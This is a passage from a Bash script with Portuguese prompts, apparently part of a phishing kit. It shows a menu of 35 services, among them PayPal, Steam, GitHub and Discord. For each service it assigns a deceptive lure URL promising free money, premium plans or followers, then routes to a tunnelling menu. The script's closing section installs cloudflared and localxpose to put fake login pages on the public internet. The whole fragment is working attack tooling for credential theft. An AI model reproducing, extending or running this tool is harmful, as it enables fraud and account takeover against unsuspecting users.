		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
		${RED}[${WHITE}34${RED}]${ORANGE} Discord       ${RED}[${WHITE}35${RED}]${ORANGE} Roblox 

		${RED}[${WHITE}99${RED}]${ORANGE} Sobre         ${RED}[${WHITE}00${WHITE}]${ORANGE} Sair

	EOF
	
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Selecione uma opção : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-500-usd-gift-card-free'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-500-usd-gift-card-free'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
		11)
			website="twitch"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		12)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		13)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		14)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		15)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		16)
			website="quora"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		17)
			website="protonmail"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		18)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		19)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		20)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
		21)
			website="deviantart"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		22)
			website="badoo"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		23)
			website="origin"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		24)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		25)
			website="yahoo"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		26)
			website="wordpress"
			mask='https://unlimited-wordpress-traffic-free'
			tunnel_menu;;
		27)
			website="yandex"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		28)
			website="stackoverflow"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		29)
			site_vk;;
		30)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		31)
			website="mediafire"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		32)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		33)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;
		34)
			website="discord"
			mask='https://get-discord-nitro-free'
			tunnel_menu;;
		35)
			website="roblox"
			mask='https://get-free-robux'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Opção inválida, tente novamente..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Principal
kill_pid
dependencies
check_status
install_cloudflared
install_localxpose
main_menu
